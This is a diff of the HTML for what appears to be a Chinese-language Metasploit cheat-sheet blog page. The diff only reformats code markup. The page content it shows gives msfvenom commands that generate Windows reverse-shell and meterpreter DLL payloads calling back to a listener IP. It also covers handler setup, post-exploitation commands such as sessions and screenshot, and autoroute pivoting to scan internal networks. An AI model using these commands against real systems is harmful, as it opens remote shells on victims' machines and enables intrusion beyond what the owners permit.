@@ -38,30 +38,30 @@
     <div class="entry-content">
       
       <h2>生成payload</h2>
-<div class="highlight"><pre><span></span><span class="n">msf监听</span><span class="err">：</span>
+<div class="highlight"><pre><span></span><code><span class="n">msf监听</span><span class="err">：</span>
 <span class="n">msfvenom</span> <span class="o">-</span><span class="n">p</span> <span class="n">windows</span><span class="o">/</span><span class="n">x64</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_tcp</span> <span class="n">LHOST</span><span class="o">=</span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">141</span><span class="p">.</span><span class="mi">35</span> <span class="n">LPORT</span><span class="o">=</span><span class="mi">8000</span> <span class="o">-</span><span class="n">f</span> <span class="n">dll</span> <span class="o">&gt;</span> <span class="o">~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">s2</span><span class="p">.</span><span class="n">dll</span>
 
 <span class="n">nc监听</span><span class="err">：</span>
 <span class="n">msfvenom</span> <span class="o">-</span><span class="n">p</span> <span class="n">windows</span><span class="o">/</span><span class="n">shell_reverse_tcp</span> <span class="n">LHOST</span><span class="o">=</span><span class="n">x</span><span class="p">.</span><span class="n">x</span><span class="p">.</span><span class="n">x</span><span class="p">.</span><span class="n">x</span> <span class="n">LPORT</span><span class="o">=</span><span class="mi">6666</span> <span class="o">-</span><span class="n">f</span> <span class="n">dll</span> <span class="o">&gt;</span> <span class="n">s2</span><span class="p">.</span><span class="n">dll</span>      
-</pre></div>
+</code></pre></div>
 
 
 <h3>监听</h3>
-<div class="highlight"><pre><span></span><span class="k">set</span> <span class="n">lhost</span> <span class="n">x</span><span class="p">.</span><span class="n">x</span><span class="p">.</span><span class="n">x</span><span class="p">.</span><span class="n">x</span>
-<span class="k">set</span> <span class="n">lport</span> <span class="n">xxx</span>
-<span class="k">set</span> <span class="n">PAYLOAD</span> <span class="n">windows</span><span class="o">/</span><span class="n">x64</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_tcp</span>  <span class="o">//</span><span class="err">使用对应的</span><span class="n">payload</span>
-<span class="n">exploit</span>
-</pre></div>
+<div class="highlight"><pre><span></span><code><span class="err">set lhost x.x.x.x</span>
+<span class="err">set lport xxx</span>
+<span class="err">set PAYLOAD windows/x64/meterpreter/reverse_tcp  //使用对应的payload</span>
+<span class="err">exploit</span>
+</code></pre></div>
 
 
 <h3>常用命令</h3>
-<div class="highlight"><pre><span></span><span class="n">exploit</span><span class="w"> </span><span class="o">-</span><span class="n">j</span><span class="w"> </span><span class="n">监听多个会话</span><span class="w"></span>
+<div class="highlight"><pre><span></span><code><span class="n">exploit</span><span class="w"> </span><span class="o">-</span><span class="n">j</span><span class="w"> </span><span class="n">监听多个会话</span><span class="w"></span>
 <span class="n">background</span><span class="w">  </span><span class="o">//</span><span class="n">会话置于后台</span><span class="w"></span>
 <span class="n">sessions</span><span class="w"> </span><span class="n">查看会话</span><span class="w"></span>
 <span class="n">screenshot</span><span class="w"> </span><span class="n">截屏</span><span class="w"></span>
 <span class="n">在添加路由表和session的关系后</span><span class="err">，</span><span class="n">可以使用msf的模块扫描网段</span><span class="err">，</span><span class="n">可以使用autoroute快速添加路由表</span><span class="err">，</span><span class="n">也可以把当前session置于后台</span><span class="err">，</span><span class="nl">然后使用route命令添加</span><span class="p">:</span><span class="w"></span>
 <span class="n">run</span><span class="w"> </span><span class="n">autoroute</span><span class="w"> </span><span class="o">-</span><span class="n">s</span><span class="w"> </span><span class="o">[</span><span class="n">ip</span><span class="o">]</span><span class="w"></span>
-</pre></div>
+</code></pre></div>
 
 
 <p>通过vps使用本地msf
